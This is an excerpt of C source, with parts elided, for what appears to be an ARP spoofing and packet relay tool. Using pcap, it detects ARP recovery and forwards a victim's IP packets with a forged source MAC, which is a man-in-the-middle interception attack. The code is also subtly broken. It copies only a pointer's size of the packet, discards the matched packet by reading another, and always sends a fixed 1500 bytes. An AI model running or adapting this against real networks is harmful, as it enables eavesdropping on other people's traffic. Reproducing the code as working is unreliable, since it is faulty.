...
int main(int argc, char* argv[])
{
	...
	u_char relay_ip_packet[1500]; // MTU
	...
	{
		pcap_next_ex(handle, &header, &recv_packet);
		memcpy(&eth, recv_packet, sizeof(eth));
		memcpy(&ip, recv_packet + sizeof(struct libnet_ethernet_hdr), sizeof(ip));
		//arp infection
		if(ntohs(eth.ether_type) == ETHERTYPE_ARP)
		{
			//printf("recv_packet s_ip: %d.%d.%d.%d\n", recv_packet[sizeof(struct libnet_ethernet_hdr) + 14], recv_packet[sizeof(struct libnet_ethernet_hdr) + 15], recv_packet[sizeof(struct libnet_ethernet_hdr) + 16], recv_packet[sizeof(struct libnet_ethernet_hdr) + 17]);
			if(!memcmp(recv_packet + sizeof(struct libnet_ethernet_hdr) + 14, d_ip_address, 4) && !memcmp(recv_packet + sizeof(struct libnet_ethernet_hdr) + 24, s_ip_address, 4))
			{
				printf("[-]Found: arp recovery\n");
		...
		{
			//printf("recv_packet s_ip: %d.%d.%d.%d\n", recv_packet[sizeof(struct libnet_ethernet_hdr) + 12], recv_packet[sizeof(struct libnet_ethernet_hdr) + 13], recv_packet[sizeof(struct libnet_ethernet_hdr) + 14], recv_packet[sizeof(struct libnet_ethernet_hdr) + 15]);
			if(!memcmp(recv_packet + sizeof(struct libnet_ethernet_hdr) + 12, s_ip_address, 4))
			{
				pcap_next_ex(handle, &header, &recv_packet);
				memcpy(&eth, recv_packet, sizeof(eth));
				for(int i=0; i< ETHER_ADDR_LEN; i++)
					eth.ether_shost[i] = 0xcc; // change source mac
				memcpy(relay_ip_packet, recv_packet, sizeof(recv_packet));
				memcpy(relay_ip_packet, &eth, sizeof(eth));
				pcap_sendpacket(handle, relay_ip_packet, sizeof(relay_ip_packet));
				printf("[-]packet relay done\n");
			}
		}
	}
	return 0;
